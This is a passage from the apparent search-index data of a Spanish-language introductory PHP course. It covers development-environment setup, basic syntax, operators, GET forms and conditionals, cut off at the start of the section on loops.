desarrollo en entorno servidor.</p>"},{"location":"01arquitecturas.html#17-hola-mundo","title":"1.7 Hola Mundo","text":"<p>Y como no, nuestro primer ejemplo ser\u00e1 un Hola Mundo en PHP.</p> <p>Si nombramos el archivo como <code>index.php</code>, al acceder a <code>http://localhost</code> autom\u00e1ticamente cargar\u00e1 el resultado:</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"es\"&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;title&gt;Hola Mundo&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;?php\n        echo \"Hola Mundo\";\n    ?&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Ubicaci\u00f3n del archivo</p> <p>Puedes crear el archivo anterior con cualquier editor de texto plano. Lo importante es que lo guardes en el directorio en el que el servidor web (Apache o Nginx) sirva los archivos.</p> <p>Si utilizas XAMPP recuerda que es <code>C:/xampp/xamppfiles/htdocs</code>. </p> <p>Y recuerda tambi\u00e9n tener arrancado el servidor web...</p>"},{"location":"01arquitecturas.html#18-entorno-de-desarrollo","title":"1.8 Entorno de desarrollo","text":"<p>Una vez tenemos listo nuestro sistema, toca elegir el entorno de desarrollo para nuestros proyectos en PHP. En este curso, trabajaremos con PphpStorm, aunque se mencionan otras alternativas como Eclipse o VS Code.</p>"},{"location":"01arquitecturas.html#phpstorm","title":"PhpStorm","text":"<p>El IDE de JetBrains PhpStorm es el que utilizaremos por ser el m\u00e1s conocido y utilizado por la comunidad para proyectos de PHP y Laravel.</p> IDE PhpStorm <p>PhpStorm es un software de pago, aunque puedes activar la licencia gratuita durante 1 a\u00f1o con tu cuenta del instituto.  Desde su men\u00fa Help &gt; Register.</p> Licencia educativa de PhpStorm <p>Para poder ejecutar directamente nuestro proyecto y que se abra en el navegador, tenemos varias opciones en PhpStorm:</p> Configurar un servidor local integrado <ol> <li>Abre la ventana de terminal: Dentro de PHPStorm, busca el icono de la terminal o usa la combinaci\u00f3n de teclas <code>Alt</code> + <code>F12</code> para abrirla.</li> <li>Navega al directorio de tu proyecto: Usa el comando cd para ir a la carpeta ra\u00edz de tu proyecto. Por ejemplo, si tu proyecto est\u00e1 en <code>C:\\Proyectos\\mi_web</code>, escribe cd <code>C:\\Proyectos\\mi_web</code>.</li> <li>Ejecuta el servidor de desarrollo PHP: Escribe y ejecuta el comando <code>php -S localhost:8000</code> (o el puerto que prefieras).</li> <li>Accede desde el navegador: Abre tu navegador web y visita la direcci\u00f3n <code>http://localhost:8000</code> para ver tu proyecto funcionando.</li> </ol> Configurar un servidor web externo (como XAMPP o Apache/Nginx) <ol> <li>Abre la ventana de <code>Settings</code> desde el men\u00fa superior.</li> <li>En el panel izquierdo ve a la secci\u00f3n <code>Build, Execution, Deployment</code> y haz clic en el apartado <code>Deployment</code>. </li> <li>A\u00f1ade una nueva configuraci\u00f3n de servidor haciendo clic en el bot\u00f3n <code>+</code> (Add) y selecciona la opci\u00f3n <code>Local o mounted folder</code>. Aqu\u00ed podr\u00edas seleccionar la opci\u00f3n <code>FTP</code> para utilizar un servidor remoto, pero es lo dejaremos para m\u00e1s adelante. </li> <li>Configura los detalles del servidor d\u00e1ndole un nombre (ejemplo: \"MiServidorLocal\"), la ruta de la carpeta del proyecto (ejemplo: C:/xampp/htdocs/proyectoX) y la URL del servidor (ejemplo: http://localhost/proyectoX). Aseg\u00farate de que el mapeo entre estas rutas sea correcto. </li> <li>Haz clic en <code>Apply</code> y <code>OK</code>.</li> <li>Para ejecutar el proyecto, desde su archivo <code>index.php</code> haz clic en el bot\u00f3n del navegador que aparece en la esquina superior derecha para verlo en tu servidor local (que deber\u00e1 estar arrancado).</li> </ol> <p>Resumen del proceso:</p> <p>    Tu navegador no soporta v\u00eddeo. </p>"},{"location":"01arquitecturas.html#eclipse","title":"Eclipse","text":"<p>Otra alternativa es utilizar Eclipse, aunque es un entorno bastante pesado y menos usado cada vez.</p>"},{"location":"01arquitecturas.html#vs-code","title":"VS Code","text":"<p>Y otra alternativa cada vez m\u00e1s usada y de c\u00f3digo libre, es Visual Studio Code (https://code.visualstudio.com) un editor de c\u00f3digo fuente que se complementa mediante extensiones para adaptarse a casi cualquier lenguaje y en este caso, comportarse como un IDE completo para PHP. Muy importante seguir estos pasos para configurarlo correctamente con PHP. Sobre todo, indicar en la variable <code>php.validate.executablePath</code> la ruta del ejecutable de PHP en el sistema. </p> <p>Extensiones a utilizar con VS Code:</p> <ul> <li>Live Server</li> <li>PHP Intelephense</li> <li>Docker</li> </ul> <p>Por ejemplo, si abrimos la extensi\u00f3n de Docker, podr\u00e9is visualizar tanto los contenedores como las im\u00e1genes de vuestro sistema. Desde cada contenedor, mediante clic derecho, podemos iniciar/detener/reiniciar cada contenedor, as\u00ed como ver su contenido o abrir un terminal dentro del mismo.</p> Opciones mediante extensi\u00f3n Docker en VSCode <p>Puedes seguir este tutorial (ingl\u00e9s) para configurar VSCode para trabajar con PHP.</p>"},{"location":"01arquitecturas.html#servidor-live-reload-para-usar-con-vs-code","title":"Servidor Live Reload (para usar con VS Code)","text":"<p>Para poder visualizar cada nuevo cambio que hagamos en una p\u00e1gina PHP como la anterior, tendremos que refrescar el navegador manualmente.</p> <p>Para refrescar el navegador de forma autom\u00e1tica podemos utilizar la extensi\u00f3n de Chrome Live Server web Extension en combinaci\u00f3n con la extensi\u00f3n de VS Code Live Server.</p> <p>Una vez instalada la extensi\u00f3n de Chrome, hay que configurarla indicando:</p> <ul> <li>La direcci\u00f3n del servidor web que utilicemos (mediante XAMPP o Docker) para acceder a nuestros archivos PHP.</li> <li>La direcci\u00f3n del Live Server que nos da VS Code.</li> </ul> Opciones de Live Server Web Extension <p>Ahora, cada vez que guardes en VS Code, los cambios se reflejar\u00e1n autom\u00e1ticamente en el navegador. Si tienes dudas puedes consultar este v\u00eddeo.</p>"},{"location":"01arquitecturas.html#19-interpretes-online","title":"1.9 Int\u00e9rpretes online","text":"<p>Existen multitud de int\u00e9rpretes de PHP online para poder probar nuestros scripts sin necesidad de tener nada instalado en local, \u00fatiles para pruebas r\u00e1pidas. Algunos de ellos:</p> <ul> <li>Programiz</li> <li>OnlinePHP</li> <li>myCompiler</li> </ul>"},{"location":"01arquitecturas.html#110-referencias","title":"1.10 Referencias","text":"<ul> <li>Curso de introducci\u00f3n a Docker, por Sergi Garc\u00eda Barea : https://sergarb1.github.io/CursoIntroduccionADocker/</li> <li>Art\u00edculo Arquitecturas Web y su evoluci\u00f3n</li> </ul>"},{"location":"01arquitecturas.html#111-actividades","title":"1.11 Actividades","text":"<ol> <li> <p>Busca en internet cuales son los tres frameworks PHP m\u00e1s utilizados e indica:</p> <ul> <li>Nombre y URL</li> <li>A\u00f1o de creaci\u00f3n</li> <li>\u00daltima versi\u00f3n</li> </ul> </li> <li> <p>Busca tres ofertas de trabajo en en Infojobs o LinkedIn de empresas cercanas o con modalidad de trabajar en remoto sobre desarrollo de software que citen PHP y anota:</p> <ul> <li>Empresa + puesto + frameworks PHP + requ\u00edsitos + sueldo + enlace a la oferta.</li> </ul> </li> <li> <p>Crea una tabla comparativa explicando con tus palabras los tipos de renderizados de sitios web.</p> </li> <li> <p>Una vez arrancado el servicio PHP (mediante XAMPP o Docker), crea el archivo <code>info.php</code> y a\u00f1ade el siguiente fragmento de c\u00f3digo:</p> <p><pre><code>&lt;?php phpinfo() ?&gt;\n</code></pre> Anota los valores de:</p> <ul> <li>Versi\u00f3n de PHP</li> <li>Loaded Configuration File</li> <li><code>memory_limit</code></li> <li><code>DOCUMENT_ROOT</code></li> <li><code>post_max_size</code></li> <li><code>upload_max_filesize</code></li> </ul> </li> <li> <p>Abre el archivo <code>php.ini</code> (puedes averiguar su ruta a partir de la propiedad Loaded Configuration File (php.ini) Path que anotaste en la actividad) e indica para qu\u00e9 sirven las siguientes propiedades y qu\u00e9 valores contienen:</p> <ul> <li><code>file_uploads</code></li> <li><code>max_execution_time</code></li> <li><code>short_open_tag</code></li> </ul> php.ini <p>Es el archivo de configuraci\u00f3n de PHP, y en algunas instalaciones vienen dos plantillas (<code>php.ini-development</code> y <code>php.ini-production</code>) para que elijamos los valores m\u00e1s acordes a nuestro proyecto y creemos nuestro archivo propio de <code>php.ini</code>.</p> </li> <li> <p>Buscar en Internet un proveedor de hosting gratuito que soporte PHP y MySQL. Reg\u00edstrate y sube el Hola Mundo que hic\u00edste. Anota aqu\u00ed la URL para acceder.</p> </li> </ol>"},{"location":"02php.html","title":"El lenguaje PHP","text":"Duraci\u00f3n y criterios de evaluaci\u00f3n <p>Duraci\u00f3n estimada: 26 sesiones</p> <p>Resultado de aprendizaje y criterios de evaluaci\u00f3n:</p> <ol> <li> <p>Escribe sentencias ejecutables por un servidor Web reconociendo y aplicando procedimientos de integraci\u00f3n del c\u00f3digo en lenguajes de marcas.</p> <ol> <li>Se han reconocido los mecanismos de generaci\u00f3n de p\u00e1ginas Web a partir de lenguajes de marcas con c\u00f3digo embebido.</li> <li>Se han identificado las principales tecnolog\u00edas asociadas.</li> <li>Se han utilizado etiquetas para la inclusi\u00f3n de c\u00f3digo en el lenguaje de marcas.</li> <li>Se ha reconocido la sintaxis del lenguaje de programaci\u00f3n que se ha de utilizar.</li> <li>Se han escrito sentencias simples y se han comprobado sus efectos en el documento resultante.</li> <li>Se han utilizado directivas para modificar el comportamiento predeterminado.</li> <li>Se han utilizado los distintos tipos de variables y operadores disponibles en el lenguaje.</li> <li>Se han identificado los \u00e1mbitos de utilizaci\u00f3n de las variables.</li> </ol> </li> </ol> <p>Resultado de aprendizaje:</p> <ol> <li>Escribe bloques de sentencias embebidos en lenguajes de marcas, seleccionando y utilizando las estructuras de programaci\u00f3n.</li> </ol> <p>Criterios de evaluaci\u00f3n:</p> <ol> <li>Se han utilizado mecanismos de decisi\u00f3n en la creaci\u00f3n de bloques de sentencias.</li> <li>Se han utilizado bucles y se ha verificado su funcionamiento.</li> <li>Se han utilizado \u201carrays\u201d para almacenar y recuperar conjuntos de datos.</li> <li>Se han creado y utilizado funciones.</li> <li>Se han utilizado formularios web para interactuar con el usuario del navegador Web.</li> <li>Se han empleado m\u00e9todos para recuperar la informaci\u00f3n introducida en el formulario.</li> <li>Se han a\u00f1adido comentarios al c\u00f3digo.</li> </ol>"},{"location":"02php.html#21-introduccion","title":"2.1 Introducci\u00f3n","text":"<ul> <li>Acr\u00f3nimo de PHP: Hypertext Preprocessor.</li> <li>Lenguaje de prop\u00f3sito general, aunque su fuerte es el desarollo web.</li> <li>Sintaxis similar a C / Java.</li> <li>El c\u00f3digo se ejecuta en el servidor (en Apache mediante mod_php).</li> <li>El cliente recibe el resultado generado tras interpretar el c\u00f3digo en el servidor.</li> <li>El c\u00f3digo se almacena en archivo con extensi\u00f3n <code>.php</code>.</li> </ul> <p>La \u00faltima versi\u00f3n estable es la 8.4.12, de agosto de 2025 (y ya est\u00e1 disponible la beta de php 8.5). Se recomienda utilizar como m\u00ednimo la versi\u00f3n 8.0 de php porque tiene mejor rendimiento y compatibilidad que versiones anteriores.</p> <p>Su documentaci\u00f3n es extensa y est\u00e1 traducida: https://www.php.net/manual/es/.</p>"},{"location":"02php.html#codigo-embebido","title":"C\u00f3digo embebido","text":"<p>Los bloques de c\u00f3digo se escriben entre <code>&lt;?php</code> y <code>?&gt;</code>, mientras que las sentencias se separan mediante <code>;</code>.</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"es\"&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;title&gt;PHP f\u00e1cil&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;!-- Muestra una frase con HTML --&gt;\n    Hola mundo&lt;br&gt;\n    &lt;!-- Muestra una frase con PHP --&gt;\n    &lt;?php echo \"Es muy f\u00e1cil programar en PHP.\"; ?&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>S\u00f3lo etiquetas de apertura</p> <p>Si nuestro c\u00f3digo s\u00f3lo va a contener c\u00f3digo PHP y nada de html, como por ejemplo, cuando codifiquemos clases o interfaces, s\u00f3lo pondremos la etiqueta de apertura, para as\u00ed indicar que es una archivo de php puro.</p>"},{"location":"02php.html#generando-contenido","title":"Generando contenido","text":"<p>Tenemos tres posibilidades a la hora de generar contenido en nuestros documentos PHP:</p> <ul> <li><code>echo</code><code>expresi\u00f3n;</code></li> <li><code>print</code><code>(expresi\u00f3n);</code> | <code>print</code><code>expresi\u00f3n;</code></li> <li><code>&lt;?=</code><code>expresi\u00f3n ?&gt;</code></li> </ul> <p>Las que vamos a utilizar son <code>echo</code> cuando lo hagamos dentro de un bloque de instrucciones y <code>&lt;?=</code> cuando s\u00f3lo vayamos a mostrar el valor de una variable dentro de un fragmento HTML.</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"es\"&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;title&gt;Echo y print&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;p&gt;&lt;?php echo \"Este texto se mostrar\u00e1 en la p\u00e1gina web.\" ?&gt;&lt;/p&gt;\n    &lt;p&gt;&lt;?= \"Este texto se mostrar\u00e1 en la p\u00e1gina web.\" ?&gt;&lt;/p&gt;\n    &lt;p&gt;&lt;?php print(\"Este texto se mostrar\u00e1 en la p\u00e1gina web.\") ?&gt;&lt;/p&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"02php.html#comentarios","title":"Comentarios","text":"<p>Podemos utilizar comentarios de una l\u00ednea o de bloque:</p> <pre><code>&lt;?php\n// Este es un comentario de una sola l\u00ednea\n/*\n  Este es\n  un comentario\n  que ocupa\n  varias l\u00edneas\n*/ \n?&gt;\n</code></pre>"},{"location":"02php.html#errores","title":"Errores","text":"<p>Si hay un error de ejecuci\u00f3n, se produce un Fatal Error.</p> <pre><code>Fatal error: Uncaught Error: Call to undefined function plint() in C:\\xampp\\htdocs\\202echo.php:11\n Stack trace:\n #0 {main}\n    thrown in C:\\xampp\\htdocs\\202echo.php on line 11\n</code></pre> <p>Desde PHP 5 se lanzan como una excepci\u00f3n. M\u00e1s adelante veremos el uso de <code>try</code> / <code>catch</code>.</p>"},{"location":"02php.html#variables","title":"Variables","text":"<ul> <li>No es necesario declararlas previamente.</li> <li>Comienzan por <code>$</code>, por ejemplo <code>$nombre</code>. Tras el <code>$</code>, el siguiente caracter debe ser una letra en min\u00fascula (recomendaci\u00f3n) o gui\u00f3n bajo <code>_</code>. Luego ya se pueden poner n\u00fameros.</li> <li>Son case sensitive: <code>$var != $vAR</code></li> <li>No se declara su tipo, el tipado es din\u00e1mico. Se asigna en tiempo de ejecuci\u00f3n dependiendo del valor asignado.</li> <li>Conveniente inicializarlas para que no d\u00e9 error de variable sin definir.</li> </ul> <pre><code>&lt;?php\n$nombre = \"Rasmus\";\n$nombreCompleto = \"Rasmus Lerdorf\";\n$numero = 123;\n$numero2 = 456;\n$pi = 3.14;\n$suerte = true;\n$sinValor;\n\necho $sinValor;\n?&gt;\n</code></pre> <p>Tipos</p> <p>Aunque a priori no hay tipos de datos, internamente PHP trabaja con cuatro tipos escalares (los que almacenan 1 valor): boolean, integer, float y string y cuatro tipos compuestos: array, object, callable e iterable. Existe un tipo especial para null (m\u00e1s informaci\u00f3n en http://php.net/manual/es/language.types.null.php).</p>"},{"location":"02php.html#constantes","title":"Constantes","text":"<p>Son variables cuyo valor no var\u00edan. Existen dos posibilidades:</p> <ul> <li><code>define(NOMBRE, valor);</code></li> <li><code>const NOMBRE; // PHP &gt; 5.3</code></li> </ul> <pre><code>&lt;?php\ndefine(\"PI\", 3.1416);\nconst IVA = 0.21;\n\necho PI, \" \", IVA; // No se pone el s\u00edmbolo dolar\n?&gt;\n</code></pre> <ul> <li>Se declaran siempre en MAY\u00daSCULAS</li> <li>Hay un conjunto de constantes ya predefinidas, tambi\u00e9n conocidas como magic constants: https://www.php.net/manual/es/language.constants.predefined.php</li> </ul>"},{"location":"02php.html#22-operadores","title":"2.2 Operadores","text":""},{"location":"02php.html#arimeticos","title":"Arim\u00e9ticos","text":"Ejemplo Nombre Resultado <code>-$a</code> Negaci\u00f3n Opuesto de <code>$a</code>. <code>$a + $b</code> Suma Suma de <code>$a</code> y <code>$b</code>. <code>$a - $b</code> Resta Diferencia de <code>$a</code> y <code>$b</code>. <code>$a * $b</code> Multiplicaci\u00f3n Producto de <code>$a</code> y <code>$b</code>. <code>$a / $b</code> Divisi\u00f3n Cociente de <code>$a</code> y <code>$b</code>. <code>$a % $b</code> M\u00f3dulo / Resto Resto de <code>$a</code> dividido por <code>$b</code>. <code>$a ** $b</code> Potencia Resultado de <code>$a</code> elevado a <code>$b</code>. PHP &gt;= 5.6. <p>En el caso de cadenas, si queremos concatenarlas, se utiliza el operador <code>.</code>:</p> <pre><code>&lt;?php\n$x = 33;\n$y = 11;\n$z = $x + $y;\necho \"La suma de 33 y 11 es \".44.\"&lt;br /&gt;\";\necho \"La suma de \".$x.\" y \".$y.\" es \".(33 + 11).\"&lt;br /&gt;\";\necho \"La suma de \".$x.\" y \".$y.\" es \".$z.\"&lt;br /&gt;\";\n?&gt;\n</code></pre> <p>Realmente, en vez de concatenar cadenas con variables, podemos imprimirlas directamente ya que se expanden autom\u00e1ticamente: <pre><code>&lt;?php\necho \"La suma de $x y $y es $z &lt;br /&gt;\";\n?&gt;\n</code></pre></p> <p>En ocasiones, necesitamos rodear el nombre de la variable entre llaves para poder unir m\u00e1s texto al resultado:</p> <pre><code>&lt;?php\n$color = \"rojo\";\necho \"El plural de $color el ${color}s\";\n?&gt;\n</code></pre> <p>M\u00e1s adelante estudiaremos algunas funciones para el tratamiento de cadenas.</p>"},{"location":"02php.html#comparacion","title":"Comparaci\u00f3n","text":"Ejemplo Nombre Resultado <code>$a == $b</code> Igual <code>true</code> si <code>$a</code> es igual a <code>$b</code> tras de la conversi\u00f3n de tipos. <code>$a === $b</code> Id\u00e9ntico, Comparaci\u00f3n estricta <code>true</code> si <code>$a</code> es igual a <code>$b</code>, y son del mismo tipo de dato. <code>$a != $b</code>, <code>$a &lt;&gt; $b</code> Diferente <code>true</code> si <code>$a</code> no es igual a <code>$b</code> despu\u00e9s de la conversi\u00f3n de tipos. <code>$a !== $b</code> No id\u00e9ntico <code>true</code> si <code>$a</code> no es igual a <code>$b</code>, o si no son del mismo tipo. <code>$a &lt; $b</code> Menor que <code>true</code> si <code>$a</code> es estrictamente menor que <code>$b</code>. <code>$a &gt; $b</code> Mayor que <code>true</code> si <code>$a</code> es estrictamente mayor que <code>$b</code>. <code>$a &lt;= $b</code> Menor o igual que <code>true</code> si <code>$a</code> es menor o igual que <code>$b</code>. <code>$a &gt;= $b</code> Mayor o igual que <code>true</code> si <code>$a</code> es mayor o igual que <code>$b</code>. <code>$a &lt;=&gt; $b</code> Nave espacial Devuelve <code>-1</code>, <code>0</code> o <code>1</code> cuando <code>$a</code> es respectivamente menor, igual, o mayor que <code>$b</code>. PHP &gt;= 7. <code>$a ?? $b ?? $c</code> Fusi\u00f3n de null El primer operando de izquierda a derecha que exista y no sea <code>null</code>. <code>null</code> si no hay valores definidos y no son <code>null</code>. PHP &gt;= 7. <p>Puedes consultar ejemplos sobre los \u00faltimos operadores aqu\u00ed.</p>"},{"location":"02php.html#logicos","title":"L\u00f3gicos","text":"Ejemplo Nombre Resultado <code>$a and $b</code>, <code>$a &amp;&amp; $b</code> And (y) <code>true</code> si tanto <code>$a</code> como <code>$b</code> son <code>true</code>. <code>$a or $b</code>, <code>$a || $b</code> Or (o inclusivo) <code>true</code> si cualquiera de <code>$a</code> o <code>$b</code> es <code>true</code>. <code>$a xor $b</code> Xor (o exclusivo) <code>true</code> si <code>$a</code> o <code>$b</code> es <code>true</code>, pero no ambos. <code>!$a</code> Not (no) <code>true</code> si <code>$a</code> no es <code>true</code>."},{"location":"02php.html#asignacion","title":"Asignaci\u00f3n","text":"Ejemplo Nombre Resultado <code>$a = $b</code> Asignaci\u00f3n Asigna a <code>$a</code> el valor de <code>$b</code> <code>$a += $b</code> Asignaci\u00f3n de la suma Le suma a <code>$a</code> el valor de <code>$b</code>. Equivalente a <code>$a = $a + $b</code> <code>$a -= $b</code> Asignaci\u00f3n de la resta Le resta a <code>$a</code> el valor de <code>$b</code>. Equivalente a <code>$a = $a - $b</code> <code>$a *= $b</code> Asignaci\u00f3n del producto Asigna a <code>$a</code> el producto de <code>$a</code> por <code>$b</code>. Equivalente a <code>$a = $a * $b</code> <code>$a /= $b</code> Asignaci\u00f3n de la divisi\u00f3n Asigna a <code>$a</code> el conciente de <code>$a</code> entre <code>$b</code>. Equivalente a <code>$a = $a / $b</code> <code>$a %= $b</code> Asignaci\u00f3n del resto Asigna a <code>$a</code> el resto de dividir <code>$a</code> entre <code>$b</code>. Equivalente a <code>$a = $a % $b</code> <code>$a .= $b</code> Concatenaci\u00f3n Concatena a <code>$a</code> la cadena <code>$b</code>. Equivalente a <code>$a = $a . $b</code> <code>$a++</code> Incremento Incrementa <code>$a</code> en una unidad. Equivalente a <code>$a = $a + 1</code> <code>$a--</code> Decremento Decrementa <code>$a</code> en una unidad. Equivalente a <code>$a = $a - 1</code> <p>Prioridad de los operadores</p> <p>Recuerda la prioridad. Primero los par\u00e9ntesis, luego la negaci\u00f3n (<code>!</code>), productos/divisiones, sumas/restas, comparaciones, l\u00f3gicos y por \u00faltimo se realiza la asignaci\u00f3n. M\u00e1s informaci\u00f3n en https://www.php.net/manual/es/language.operators.precedence.php</p> <p>Autoevaluaci\u00f3n</p> <p>Si <code>$a=5</code> y <code>$b=4</code>, averigua el valor de <code>$c</code> si <code>$c = $a*2 &gt; $b+5 &amp;&amp; !($b&lt;&gt;4)</code></p>"},{"location":"02php.html#23-trabajando-con-formularios","title":"2.3 Trabajando con formularios","text":"<p>Los datos se env\u00edan via URL con el formato <code>var1=valor1&amp;var2=valor2\u2026</code>. Por ejemplo: <code>ejemplo.php?nombre=Bruce+apellido1=Wayne</code></p> <p>Se divide en dos pasos:</p> <ol> <li>Generar un formulario con <code>action='archivo.php' method='GET'</code></li> <li>En el archivo <code>.php</code> leer los datos con <code>$_GET['nombreVar']</code></li> </ol> <p>Vamos a separar siempre que podamos el c\u00f3digo HTML del de PHP. Por ejemplo, el formulario lo colocamos en <code>saluda.html</code>:</p> <pre><code>&lt;form action=\"saluda.php\" method=\"get\"&gt;\n    &lt;p&gt;&lt;label for=\"nombre\"&gt;Nombre: &lt;/label&gt;\n    &lt;input type=\"text\" name=\"nombre\" id=\"nombre\"&gt;&lt;/p&gt;\n    &lt;p&gt;&lt;label for=\"apellido1\"&gt;Primer apellido:&lt;/label&gt; \n    &lt;input type=\"text\" name=\"apellido1\" id=\"apellido1\"&gt;&lt;/p&gt;\n    &lt;p&gt;&lt;input type=\"submit\" value=\"enviar\"&gt;&lt;/p&gt;\n&lt;/form&gt;\n</code></pre> <p>Y recogemos los datos en <code>saluda.php</code>:</p> <pre><code>&lt;?php\n$nombre = $_GET[\"nombre\"];\n$apellido1 = $_GET[\"apellido1\"];\n\necho \"Hola $nombre $apellido1\";\n?&gt;\n</code></pre> <p>Si lo quisi\u00e9ramos realizar todo en un \u00fanico archivo (lo cual no es recomendable), podemos hacerlo as\u00ed:</p> <pre><code>&lt;form action=\"\" method=\"get\"&gt;\n    &lt;p&gt;&lt;label for=\"nombre\"&gt;Nombre: &lt;/label&gt;\n    &lt;input type=\"text\" name=\"nombre\" id=\"nombre\"&gt;&lt;/p&gt;\n    &lt;p&gt;&lt;label for=\"apellido1\"&gt;Primer apellido:&lt;/label&gt;\n    &lt;input type=\"text\" name=\"apellido1\" id=\"apellido1\"&gt;&lt;/p&gt;\n    &lt;input type=\"submit\" value=\"enviar\"&gt;\n&lt;/form&gt;\n&lt;p&gt;\n    &lt;?php\n    if(isset($_GET['nombre'])) {\n        $nombre = $_GET[\"nombre\"];\n        $apellido1 = $_GET[\"apellido1\"];\n\n        echo \"Hola $nombre $apellido1\";\n    }\n    ?&gt;\n&lt;/p&gt;\n</code></pre> <p>El trabajo con formularios lo estudiaremos en profundidad en la unidad 4, y veremos que adem\u00e1s de <code>GET</code>, podemos enviar los datos con <code>POST</code>.</p>"},{"location":"02php.html#24-condicionales","title":"2.4 Condicionales","text":"<p>La condici\u00f3n simple se realiza mediante la instrucci\u00f3n <code>if</code>. Entre par\u00e9ntesis se pone la condici\u00f3n que se evalua a <code>true</code> o <code>false</code>. Si no se ponen llaves, en vez de abrir un bloque, se ejecutar\u00e1 s\u00f3lo la siguiente instrucci\u00f3n.</p> <p>Siempre llaves</p> <p>Es recomendable poner llaves siempre aunque en el momento de codificar s\u00f3lo haya una \u00fanica instrucci\u00f3n. De este modo, se queda preparado para a\u00f1adir m\u00e1s contenido en el futuro sin provocar bugs.</p> <pre><code>&lt;?php\n$hora = 8; // La hora en formato de 24 horas\nif ($hora === 8) {\n    echo \"Suena el despertador.\";\n}\necho \"&lt;br&gt;\";\nif ($hora === 8)\n    echo \"Suena el despertador.\";\n?&gt;\n</code></pre> <p>Las condiciones compuesta mediante <code>if-else</code>:</p> <pre><code>&lt;?php\n$hora = 17; // La hora en formato de 24 horas\nif ($hora &lt;= 12) {\n    echo \"Son las \" . $hora . \" de la ma\u00f1ana\";\n} else {\n    echo \"Son las \" . ($hora - 12) . \" de la tarde\";\n}\n?&gt;\n</code></pre> <p>Las condiciones anidadas mediante <code>if-else if-else</code>:</p> <pre><code>&lt;?php\n$hora = 14; // La hora en formato de 24 horas\nif ($hora === 8) {\n    echo \"Es la hora de desayunar.\";\n} else if ($hora === 14) {\n    echo \"Es la hora de la comida.\";\n} else if ($hora === 21) {\n    echo \"Es la hora de la cena.\";\n} else {\n    echo \"Ahora no toca comer.\";\n}\n?&gt;\n</code></pre> <p>La sentencia <code>switch</code> tambi\u00e9n permite trabajar con condiciones m\u00faltiples:</p> <pre><code>&lt;?php\n$hora = 14; // La hora en formato de 24 horas\nswitch ($hora) {\n    case 9:\n        echo \"Es la hora de desayunar.\";\n        break;\n    case 14:\n        echo \"Es la hora de la comida.\";\n        break;\n    case 21:\n        echo \"Es la hora de la cena.\";\n        break;\n    default:\n        echo \"Ahora no toca comer\";\n}\n?&gt;\n</code></pre> <p>No olvides el <code>break</code></p> <p>Un error muy com\u00fan es olvidar la instrucci\u00f3n <code>break</code> tras cada caso. Si no lo ponemos, ejecutar\u00e1 el siguiente caso autom\u00e1ticamente.</p> <p>La expresi\u00f3n <code>match</code> (PHP 8.0) permite asignar un valor seg\u00fan m\u00faltiples condiciones, funcionando de forma similar a la sentencia <code>switch</code>, solo que realiza una comprobaci\u00f3n de identidad (===) en lugar de una comprobaci\u00f3n de igualdad d\u00e9bil (==) como hace este \u00faltimo.</p> <pre><code>&lt;?php\n\n // Ejemplo b\u00e1sico\n $comida = 'pastel';\n\n $valor_devuelto = match ($comida) {\n     'manzana' =&gt; 'Esta comida es una manzana',\n     'barra' =&gt; 'Esta comida es una barra',\n     'pastel' =&gt; 'Esta comida es un pastel',\n };\n\n // Ejemplo con operadores de comparaci\u00f3n\n$age = 18;\n\n$output = match (true) {\n     $age &lt; 2 =&gt; 'Eres un beb\u00e9',\n     $age &lt; 10 =&gt; 'Eres un ni\u00f1o',\n     $age &lt; 18 =&gt; 'Eres un adolescente',\n     $age &gt;= 18 &amp;&amp; $age &lt; 30 =&gt; 'Eres jovenzuelo',\n     $age &lt; 45 =&gt; 'Eres un viejoven',\n     $age &gt;= 45 &amp;&amp; $age &lt; 90 &gt; =&gt; 'Eres un viejuno',\n     default =&gt; 'Matusal\u00e9n!!!'\n};\n\n// Ejemplo con expresiones regulares\n$string = \"Vamos al bar\";\n\n$message = match (true) {\n    preg_match('/^foo/', $string) =&gt; 'string empieza por foo',\n    preg_match('/bar$/', $string) =&gt; 'string termina por bar',\n    default =&gt; 'string no empieza por foo ni termina por bar',\n};\n\n?&gt;\n</code></pre> <p>Finalmente, tambi\u00e9n tenemos el operador ternario <code>condici\u00f3n ? valorTrue : valorFalse</code>:</p> <pre><code>&lt;?php\n$hora = 14;\n$formato = ($hora &gt; 12) ? 24 : 12;\necho \"El formato es de $formato horas\"\n?&gt;\n</code></pre> <p>Si queremos comprobar si una variable tiene valor y si no darle un valor determinado, usaremos el operador <code>?:</code> (se conoce como el operador Elvis - https://en.wikipedia.org/wiki/Elvis_operator) con la sint\u00e1xis <code>expresi\u00f3n ?: valorSiVacio</code>:</p> <pre><code>&lt;?php\n$nombre = $_GET['nombre'] ?: \"desconocido\"\n?&gt;\n</code></pre> <p>Realmente es como un operador ternario sin especificar la parte intermedia. La expresi\u00f3n expr1 ?: expr3 devuelve expr1 si expr1 se eval\u00faa como true y expr3 si es de otra manera.</p>"},{"location":"02php.html#25-bucles","title":"2.5 Bucles","text":"<p>Mediante la instrucci\u00f3n <code>while</code>:</p> <pre><code>&lt;?php\n$i = 1;\nwhile ($i &lt;= 10) {\n    echo \"L\u00ednea \" . $i;\n    echo \"&lt;br&gt;\";\n    $i++;\n}\n?&gt;\n</code></pre> <p>Mediante la instrucci\u00f3n <code>do-while</code>:</p> <pre><code>&lt;?php\ndo {\n    $dado = rand(1, 6);\n    // rand() devuelve un valor aleatorio \n    echo \"Tirando el dado... \";\n    echo \"ha salido un \" . $dado . \".\";\n    echo \"&lt;br&gt;\";\n} while ($dado != 5);\necho \"\u00a1Bien! Saco una ficha de casa.\";\n?&gt;\n</code></pre> <p>Mediante la 